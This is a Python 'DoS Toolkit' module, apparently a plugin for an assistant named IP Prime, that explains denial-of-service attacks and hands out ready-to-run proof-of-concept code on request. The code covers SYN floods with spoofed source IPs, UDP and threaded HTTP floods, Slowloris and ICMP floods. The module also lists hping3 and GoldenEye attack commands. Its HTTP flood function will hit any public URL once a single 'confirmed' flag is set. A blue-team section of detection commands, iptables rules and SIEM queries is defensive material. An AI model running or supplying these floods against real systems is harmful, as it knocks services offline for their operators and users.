"""
╔══════════════════════════════════════════════════════════════════════════╗
║          ⚡ DoS TOOLKIT — IP PRIME SECURITY RESEARCH MODULE ⚡            ║
║                                                                          ║
║  ⚠️  FOR AUTHORIZED PENETRATION TESTING AND EDUCATION ONLY               ║
║  ⚠️  DoS attacks on systems without permission = ILLEGAL (IT Act 66)     ║
║                                                                          ║
║  Covers:                                                                 ║
║  • DoS/DDoS attack types and theory                                      ║
║  • SYN Flood, UDP Flood, HTTP Flood, Slowloris, ICMP Flood               ║
║  • Amplification attacks (DNS, NTP, SSDP)                                ║
║  • Python-based PoC tools (localhost/lab testing only)                   ║
║  • Detection and defense (Blue Team)                                     ║
║  • SIEM rules for DoS detection                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import socket
import struct
import random
import time
import threading
from datetime import datetime

if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BANNER = """╔══════════════════════════════════════════════════════════════╗
║          ⚡ DoS TOOLKIT — IP PRIME RESEARCH EDITION ⚡         ║
║     FOR AUTHORIZED PENTESTING & EDUCATION ONLY               ║
╚══════════════════════════════════════════════════════════════╝"""

WARNING = """
⚠️  LEGAL WARNING:
   DoS/DDoS attacks without written permission = CRIMINAL OFFENSE
   India: IT Act Section 66 → Up to 3 years jail + ₹5 Lakh fine
   Use ONLY on: your own systems, lab environments, CTF challenges
   Always get written authorization before testing!
"""


def _get_api_key():
    try:
        base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        cfg = os.path.join(base, "config", "api_keys.json")
        with open(cfg, encoding="utf-8") as f:
            return json.load(f).get("gemini_api_key", "")
    except Exception:
        return ""


def _ai_explain(prompt: str) -> str:
    api_key = _get_api_key()
    if not api_key:
        return ""
    try:
        from google import genai
        client = genai.Client(api_key=api_key)
        try:
            resp = client.models.generate_content(model="gemini-2.5-flash", contents=prompt)
        except Exception:
            resp = client.models.generate_content(model="gemini-flash-latest", contents=prompt)
        return resp.text.strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════
# 1. DoS ATTACK TYPES — COMPLETE THEORY
# ════════════════════════════════════════════════════════════════

DOS_ATTACK_TYPES = {
    "syn_flood": {
        "name": "SYN Flood",
        "layer": "Layer 4 (Transport)",
        "protocol": "TCP",
        "how": (
            "Attacker sends thousands of SYN packets with spoofed source IPs.\n"
            "Server replies with SYN-ACK and waits for ACK (half-open connection).\n"
            "Server's connection table fills up → legitimate connections rejected.\n"
            "Each half-open connection stays for ~75 seconds (timeout)."
        ),
        "tools": ["hping3 -S --flood -V -p 80 <target>", "scapy (Python)", "nmap --script dos"],
        "impact": "HIGH — can take down servers without firewall protection",
        "defense": ["SYN Cookies", "Rate limiting", "Firewall SYN rate rules", "Cloudflare/Akamai"],
        "python_poc": """
# SYN Flood PoC (Educational - Requires raw socket = root/admin)
from scapy.all import *
import random

def syn_flood(target_ip, target_port, count=100):
    \"\"\"SYN Flood - ONLY for your own lab systems!\"\"\"
    print(f"[DoS] SYN Flood: {target_ip}:{target_port} ({count} packets)")
    for i in range(count):
        # Spoofed source IP
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=0)
        if i % 10 == 0:
            print(f"  Sent {i+1}/{count} SYN packets...")
    print("[DoS] SYN Flood complete.")
""",
    },

    "udp_flood": {
        "name": "UDP Flood",
        "layer": "Layer 4 (Transport)",
        "protocol": "UDP",
        "how": (
            "Attacker sends massive UDP packets to random ports.\n"
            "Target checks for listening application on each port.\n"
            "If no app found → sends ICMP 'Destination Unreachable'.\n"
            "Overwhelms both incoming and outgoing bandwidth."
        ),
        "tools": ["hping3 --udp -p 53 --flood <target>", "udpflood.py", "scapy"],
        "impact": "HIGH — bandwidth exhaustion, router overload",
        "defense": ["UDP rate limiting", "Block unused UDP ports", "Firewall rules", "CDN protection"],
        "python_poc": """
# UDP Flood PoC (Educational)
import socket, random, threading

def udp_flood(target_ip, target_port=80, duration=10):
    \"\"\"UDP Flood - ONLY for your own lab!\"\"\"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)  # 1KB random payload
    end_time = time.time() + duration
    count = 0
    
    print(f"[DoS] UDP Flood: {target_ip}:{target_port} for {duration}s")
    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, target_port))
            count += 1
        except Exception:
            pass
    print(f"[DoS] Sent {count} UDP packets.")
    sock.close()
""",
    },

    "http_flood": {
        "name": "HTTP Flood (Layer 7)",
        "layer": "Layer 7 (Application)",
        "protocol": "HTTP/HTTPS",
        "how": (
            "Attacker sends thousands of legitimate-looking HTTP GET/POST requests.\n"
            "Each request consumes web server resources (CPU, memory, DB queries).\n"
            "Harder to detect than SYN/UDP — looks like real traffic.\n"
            "Can bypass network-layer protections."
        ),
        "tools": ["wrk", "ab (Apache Bench)", "siege", "LOIC", "slowhttptest"],
        "impact": "VERY HIGH — bypasses basic firewalls, targets app layer",
        "defense": ["Rate limiting per IP", "CAPTCHAs", "WAF (CloudFlare)", "Bot detection", "Connection limits"],
        "python_poc": """
# HTTP Flood PoC (Educational - use on your own server only!)
import requests, threading, time

def http_flood(url, threads=10, duration=10):
    \"\"\"HTTP Flood - ONLY your own web server!\"\"\"
    stop = threading.Event()
    counts = [0] * threads
    
    def flood(tid):
        while not stop.is_set():
            try:
                requests.get(url, timeout=2)
                counts[tid] += 1
            except Exception:
                pass
    
    print(f"[DoS] HTTP Flood: {url} | {threads} threads | {duration}s")
    ts = [threading.Thread(target=flood, args=(i,)) for i in range(threads)]
    for t in ts: t.start()
    time.sleep(duration)
    stop.set()
    for t in ts: t.join()
    print(f"[DoS] Total requests: {sum(counts)}")
""",
    },

    "slowloris": {
        "name": "Slowloris",
        "layer": "Layer 7 (Application)",
        "protocol": "HTTP",
        "how": (
            "Attacker opens many connections to web server.\n"
            "Sends partial HTTP requests — never completes them.\n"
            "Keeps connections alive with 'X-a: b\\r\\n' headers every ~15s.\n"
            "Server waits for complete request → connection slots fill up.\n"
            "With just ~200-300 connections, can take down Apache!"
        ),
        "tools": ["slowloris.py (Robert Hansen)", "slowhttptest", "OWASP HTTP POST tool"],
        "impact": "EXTREME vs Apache — low bandwidth needed, very stealthy",
        "defense": ["Nginx (not vulnerable by design)", "mod_reqtimeout", "Connection limits", "Reverse proxy"],
        "python_poc": """
# Slowloris PoC (Educational)
import socket, time, random, threading

def slowloris(target, port=80, connections=200):
    \"\"\"Slowloris - ONLY your own Apache server!\"\"\"
    sockets = []
    
    # Build initial connections
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            # Send partial HTTP request
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\\r\\n".encode())
            s.send(f"Host: {target}\\r\\n".encode())
            sockets.append(s)
        except Exception:
            pass
    
    print(f"[Slowloris] {len(sockets)} connections opened to {target}:{port}")
    
    # Keep connections alive
    while True:
        alive = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\\r\\n".encode())
                alive.append(s)
            except Exception:
                pass
        sockets[:] = alive
        print(f"[Slowloris] Keeping {len(sockets)} connections alive...")
        time.sleep(15)
""",
    },

    "icmp_flood": {
        "name": "ICMP Flood (Ping Flood / Smurf)",
        "layer": "Layer 3 (Network)",
        "protocol": "ICMP",
        "how": (
            "Ping Flood: Sends massive ICMP Echo Requests to target.\n"
            "Smurf Attack: Sends ICMP to broadcast address with spoofed source=target.\n"
            "All hosts on network reply to target → amplification.\n"
            "Target overwhelmed with ICMP Echo Replies."
        ),
        "tools": ["hping3 --icmp --flood <target>", "ping -f (Linux)", "scapy"],
        "impact": "MEDIUM — mostly bandwidth exhaustion",
        "defense": ["Block ICMP at firewall", "Rate limit ping", "Disable directed broadcasts"],
        "python_poc": """
# ICMP Flood PoC (requires root/admin + scapy)
from scapy.all import *

def icmp_flood(target_ip, count=500):
    \"\"\"ICMP Flood - ONLY your own lab!\"\"\"
    print(f"[DoS] ICMP Flood: {target_ip} ({count} packets)")
    pkt = IP(dst=target_ip)/ICMP()
    send(pkt * count, verbose=0)
    print("[DoS] ICMP Flood complete.")
""",
    },

    "dns_amplification": {
        "name": "DNS Amplification (DRDoS)",
        "layer": "Layer 4/7",
        "protocol": "UDP/DNS",
        "how": (
            "Attacker sends small DNS queries (60 bytes) with spoofed source IP = victim.\n"
            "DNS server responds with large answer (3000+ bytes) to victim.\n"
            "Amplification factor: up to 70x!\n"
            "Attacker uses open DNS resolvers as 'amplifiers'.\n"
            "1 Gbps attacker → 70 Gbps hits victim."
        ),
        "tools": ["Requires botnet + open resolvers"],
        "impact": "EXTREME — record-breaking DDoS attacks (1+ Tbps seen)",
        "defense": ["Disable open recursion on DNS servers", "Response Rate Limiting (RRL)", "BCP38 (ISP-level)"],
        "python_poc": "# DNS Amplification requires ISP-level spoofing — not reproducible in lab without special setup.",
    },

    "ntp_amplification": {
        "name": "NTP Amplification",
        "layer": "Layer 4",
        "protocol": "UDP/NTP",
        "how": (
            "NTP MONLIST command returns list of last 600 clients.\n"
            "Small request → massive response (amplification ~556x!).\n"
            "Spoofed source = victim IP → victim gets flooded.\n"
            "Used in largest DDoS attacks in history."
        ),
        "tools": ["ntpdc -c monlist <server>  (testing only)"],
        "impact": "EXTREME — 556x amplification factor",
        "defense": ["Disable MONLIST in NTP servers", "Block UDP/123 from internet", "Rate limiting"],
        "python_poc": "# NTP Amplification — similar to DNS amp, requires IP spoofing at network level.",
    },
}


# ════════════════════════════════════════════════════════════════
# 2. DoS DETECTION RULES (BLUE TEAM)
# ════════════════════════════════════════════════════════════════

DOS_DETECTION_RULES = """
🔵 BLUE TEAM — DoS DETECTION RULES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 NETWORK INDICATORS:
  • SYN Flood: Many SYN, few ACK → SYN:ACK ratio > 100:1
  • UDP Flood: Sudden spike in UDP traffic volume
  • ICMP Flood: ICMP packets > 1000/sec from single IP
  • HTTP Flood: Same IP > 500 req/min to same endpoint
  • Slowloris: Many half-open connections (ESTABLISHED, no data)

🔍 LINUX DETECTION COMMANDS:
  # Check SYN_RECV (half-open) connections:
  netstat -an | grep SYN_RECV | wc -l
  
  # Top IPs connecting most:
  netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20
  
  # Connections per state:
  ss -s
  
  # Real-time traffic analysis:
  iftop -i eth0
  nethogs eth0

🛡️ IPTABLES DEFENSE RULES:
  # Limit SYN packets (anti SYN flood):
  iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
  iptables -A INPUT -p tcp --syn -j DROP
  
  # Limit ICMP:
  iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
  iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
  
  # Limit HTTP connections per IP:
  iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 -j REJECT
  
  # Block UDP flood:
  iptables -A INPUT -p udp -m limit --limit 10/s -j ACCEPT
  iptables -A INPUT -p udp -j DROP

📈 SPLUNK SIEM QUERIES:
  # SYN Flood detection:
  index=network action=allowed proto=tcp flags=SYN
  | stats count by src_ip
  | where count > 1000
  | sort -count
  
  # HTTP Flood:
  index=web_logs
  | stats count by src_ip, uri
  | where count > 500
  | eval threat="HTTP_FLOOD"

🔥 CLOUDFLARE / NGINX RATE LIMITING:
  # nginx.conf:
  limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
  limit_req zone=one burst=20 nodelay;
  limit_conn_zone $binary_remote_addr zone=addr:10m;
  limit_conn addr 10;
"""


# ════════════════════════════════════════════════════════════════
# 3. STRESS TESTING (Authorized Only — Own Server)
# ════════════════════════════════════════════════════════════════

def run_http_stress_test(url: str, threads: int = 10, duration: int = 10, player=None) -> str:
    """
    📊 HTTP STRESS TEST — Authorized load testing for your own server.
    Like Apache Bench (ab) but in Python.
    """
    if player:
        player.write_log(f"[DoS-Toolkit] HTTP stress test: {url} | {threads} threads | {duration}s")

    lines = [BANNER, f"         📊 HTTP STRESS TEST — {url}",
             "══════════════════════════════════════════════════════════════",
             WARNING,
             f"🎯 Target    : {url}",
             f"🔀 Threads   : {threads}",
             f"⏱️  Duration  : {duration} seconds",
             ""]

    import urllib.request
    import urllib.error

    stop_event = threading.Event()
    results = {"success": 0, "errors": 0, "total_bytes": 0}
    lock = threading.Lock()
    start_time = time.time()

    def worker():
        while not stop_event.is_set():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "IPPrime-StressTest/1.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = resp.read()
                    with lock:
                        results["success"] += 1
                        results["total_bytes"] += len(data)
            except Exception:
                with lock:
                    results["errors"] += 1

    # Start threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    # Run for duration
    time.sleep(duration)
    stop_event.set()
    for t in thread_list:
        t.join(timeout=2)

    elapsed = time.time() - start_time
    total_req = results["success"] + results["errors"]
    rps = total_req / elapsed if elapsed > 0 else 0
    mb_transferred = results["total_bytes"] / (1024 * 1024)

    lines += [
        "📊 STRESS TEST RESULTS:",
        "─" * 60,
        f"  ✅ Successful requests : {results['success']:,}",
        f"  ❌ Failed requests     : {results['errors']:,}",
        f"  📦 Data transferred    : {mb_transferred:.2f} MB",
        f"  ⚡ Requests/second     : {rps:.1f} req/s",
        f"  ⏱️  Test duration       : {elapsed:.1f}s",
        "",
        "🎯 INTERPRETATION:",
    ]

    if rps < 50:
        lines.append("  🔴 Server struggling — LOW capacity (< 50 req/s)")
    elif rps < 200:
        lines.append("  🟡 Server moderate — needs optimization (50-200 req/s)")
    elif rps < 1000:
        lines.append("  🟢 Server healthy — good capacity (200-1000 req/s)")
    else:
        lines.append("  🏆 Server excellent — high capacity (> 1000 req/s)")

    if results["errors"] > results["success"] * 0.1:
        lines.append("  ⚠️  High error rate — server may be overwhelmed!")

    lines += [
        "",
        "─" * 60,
        "💡 Compare: Apache Bench → ab -n 1000 -c 10 " + url,
        "═" * 60,
    ]
    return "\n".join(lines)


# ════════════════════════════════════════════════════════════════
# MAIN DISPATCHER
# ════════════════════════════════════════════════════════════════

def dos_toolkit(parameters: dict, player=None) -> str:
    """
    ⚡ DoS Toolkit — IP Prime Security Research Module.
    Covers DoS/DDoS theory, tools, PoC code, and defense.
    FOR AUTHORIZED TESTING AND EDUCATION ONLY.
    """
    action = parameters.get("action", "").lower().strip()

    if not action:
        return (
            f"{BANNER}\n{WARNING}\n"
            "⚡ DoS TOOLKIT ACTIONS:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  learn          — Complete DoS/DDoS theory (all attack types)\n"
            "  attack_detail  — Deep dive into specific attack (target: syn_flood/udp_flood/http_flood/slowloris/icmp_flood/dns_amp/ntp_amp)\n"
            "  poc_code       — Get Python PoC code for attack type\n"
            "  stress_test    — Authorized HTTP stress test on your server\n"
            "  defense        — Blue team detection + defense rules\n"
            "  tools_list     — All DoS/DDoS tools reference list\n"
        )

    # ── learn ──────────────────────────────────────────────────
    if action == "learn":
        lines = [BANNER, WARNING,
                 "📚 DoS/DDoS ATTACK TYPES — COMPLETE GUIDE",
                 "══════════════════════════════════════════════════════════════"]

        for key, atk in DOS_ATTACK_TYPES.items():
            lines += [
                f"",
                f"{'─'*60}",
                f"⚡ {atk['name']}",
                f"   Layer    : {atk['layer']}",
                f"   Protocol : {atk['protocol']}",
                f"   Impact   : {atk['impact']}",
                f"",
                f"   HOW IT WORKS:",
            ]
            for line in atk["how"].split("\n"):
                lines.append(f"   {line}")
            lines += [
                f"",
                f"   TOOLS    : {' | '.join(atk['tools'][:2])}",
                f"   DEFENSE  : {' | '.join(atk['defense'][:3])}",
            ]

        ai = _ai_explain(
            "You are a cybersecurity expert. Explain the DoS attack kill chain from attacker's perspective "
            "and how modern CDNs like Cloudflare stop them. Be tactical. Max 150 words."
        )
        if ai:
            lines += ["", "═" * 60, "🤖 AI INSIGHT:", ai]

        lines.append("═" * 60)
        return "\n".join(lines)

    # ── attack_detail ──────────────────────────────────────────
    elif action == "attack_detail":
        target = parameters.get("target", parameters.get("attack_type", "")).lower().replace("-", "_")

        # Map aliases
        aliases = {
            "syn": "syn_flood", "udp": "udp_flood", "http": "http_flood",
            "slowloris": "slowloris", "icmp": "icmp_flood", "ping": "icmp_flood",
            "dns": "dns_amplification", "dns_amp": "dns_amplification",
            "ntp": "ntp_amplification", "ntp_amp": "ntp_amplification",
        }
        target = aliases.get(target, target)

        if target not in DOS_ATTACK_TYPES:
            return (f"Unknown attack type: '{target}'\n"
                    f"Available: {' | '.join(DOS_ATTACK_TYPES.keys())}")

        atk = DOS_ATTACK_TYPES[target]
        lines = [BANNER, WARNING,
                 f"         ⚡ DEEP DIVE: {atk['name']}",
                 "══════════════════════════════════════════════════════════════",
                 f"🔴 Layer     : {atk['layer']}",
                 f"🔴 Protocol  : {atk['protocol']}",
                 f"🔴 Impact    : {atk['impact']}",
                 "", "📖 HOW IT WORKS:"]

        for line in atk["how"].split("\n"):
            lines.append(f"  {line}")

        lines += ["", "🛠️ TOOLS:"]
        for tool in atk["tools"]:
            lines.append(f"  • {tool}")

        lines += ["", "🛡️ DEFENSE:"]
        for defense in atk["defense"]:
            lines.append(f"  ✅ {defense}")

        ai = _ai_explain(
            f"Security expert: Explain {atk['name']} attack in detail — "
            f"packet structure, why it works, real-world examples, and top 3 defenses. "
            f"Be technical and precise. Max 200 words."
        )
        if ai:
            lines += ["", "─" * 60, "🤖 AI DEEP ANALYSIS:", ai]

        lines.append("═" * 60)
        return "\n".join(lines)

    # ── poc_code ───────────────────────────────────────────────
    elif action == "poc_code":
        attack_type = parameters.get("target", parameters.get("attack_type", "http_flood")).lower().replace("-", "_")

        aliases = {
            "syn": "syn_flood", "udp": "udp_flood", "http": "http_flood",
            "slowloris": "slowloris", "icmp": "icmp_flood",
        }
        attack_type = aliases.get(attack_type, attack_type)

        if attack_type not in DOS_ATTACK_TYPES:
            return f"No PoC for '{attack_type}'. Available: syn_flood | udp_flood | http_flood | slowloris | icmp_flood"

        atk = DOS_ATTACK_TYPES[attack_type]
        poc = atk.get("python_poc", "# PoC not available for this attack type")

        lines = [BANNER, WARNING,
                 f"         💻 PoC CODE: {atk['name']}",
                 "══════════════════════════════════════════════════════════════",
                 f"⚠️  Use ONLY on your own authorized systems!",
                 "",
                 "```python",
                 poc.strip(),
                 "```",
                 "",
                 "📦 DEPENDENCIES:"]

        if "scapy" in poc:
            lines.append("  pip install scapy  (+ run as Administrator/root)")
        if "requests" in poc:
            lines.append("  pip install requests")
        if "socket" in poc:
            lines.append("  socket — built-in Python")

        lines += [
            "",
            "🧪 LAB SETUP (safe testing):",
            "  1. Setup VirtualBox/VMware with 2 VMs",
            "  2. VM1 = Attacker (run PoC)",
            "  3. VM2 = Target (your web server)",
            "  4. Host-only network (isolated from internet)",
            "  5. Monitor with Wireshark on target",
            "═" * 60,
        ]
        return "\n".join(lines)

    # ── stress_test ────────────────────────────────────────────
    elif action == "stress_test":
        url = parameters.get("url", parameters.get("target", "")).strip()
        if not url:
            return "Error: 'url' required for stress_test. E.g., url='http://localhost:8080'"
        if not url.startswith("http"):
            url = "http://" + url

        threads = int(parameters.get("threads", 10))
        duration = int(parameters.get("duration", 10))

        # Safety check — block public IPs/domains unless explicitly confirmed
        import re
        is_local = any(url.startswith(p) for p in [
            "http://localhost", "http://127.", "http://10.", "http://192.168.",
            "http://172.16.", "http://172.17.", "https://localhost"
        ])
        if not is_local:
            confirmed = parameters.get("confirmed", "").lower()
            if confirmed != "yes":
                return (
                    f"{BANNER}\n"
                    f"⚠️  TARGET IS NOT LOCAL: {url}\n\n"
                    f"Stress testing public servers without permission is ILLEGAL.\n"
                    f"If you have written authorization, add: confirmed='yes'\n\n"
                    f"For safe testing, use: url='http://localhost:8080'"
                )

        return run_http_stress_test(url, threads=threads, duration=duration, player=player)

    # ── defense ────────────────────────────────────────────────
    elif action == "defense":
        return BANNER + "\n" + DOS_DETECTION_RULES

    # ── tools_list ─────────────────────────────────────────────
    elif action == "tools_list":
        lines = [BANNER, WARNING,
                 "🛠️ DoS/DDoS TOOLS REFERENCE",
                 "══════════════════════════════════════════════════════════════",
                 "",
                 "📦 LINUX/KALI TOOLS:",
                 "  hping3       — SYN/UDP/ICMP flood, IP spoofing",
                 "                 hping3 -S --flood -V -p 80 <target>",
                 "  ab           — Apache Bench HTTP load test",
                 "                 ab -n 10000 -c 100 http://target/",
                 "  wrk          — HTTP benchmark tool",
                 "                 wrk -t12 -c400 -d30s http://target/",
                 "  siege        — HTTP stress testing",
                 "                 siege -c 100 -t 30S http://target/",
                 "  slowhttptest — Slowloris, SlowPOST, SlowRead",
                 "                 slowhttptest -c 1000 -H -g -o slow -i 10 -r 200 -t GET -u http://target/",
                 "  t50          — Mixed packet flood tool",
                 "  mdk4         — WiFi DoS (deauth attacks)",
                 "",
                 "🐍 PYTHON TOOLS:",
                 "  GoldenEye    — HTTP DoS tool",
                 "                 python GoldenEye.py http://target/ -w 50",
                 "  Slowloris    — Original by RSnake",
                 "                 python slowloris.py <target>",
                 "  HOIC         — High Orbit Ion Cannon (HTTP flood)",
                 "  PyFlooder    — Multi-protocol flood",
                 "",
                 "🌐 NETWORK-LEVEL:",
                 "  scapy        — Craft custom packets (SYN, UDP, ICMP)",
                 "  tcpreplay    — Replay captured traffic at high speed",
                 "  iperf3       — Network bandwidth testing",
                 "                 iperf3 -c <target> -u -b 1G",
                 "",
                 "🔬 TESTING LABS (Legal & Free):",
                 "  DVWA         — Damn Vulnerable Web Application",
                 "  Metasploitable — Intentionally vulnerable VM",
                 "  HackTheBox   — Online CTF (https://hackthebox.com)",
                 "  TryHackMe    — Guided labs (https://tryhackme.com)",
                 "═" * 60,
                 ]
        return "\n".join(lines)

    else:
        return f"Unknown action: '{action}'. Use: learn | attack_detail | poc_code | stress_test | defense | tools_list"
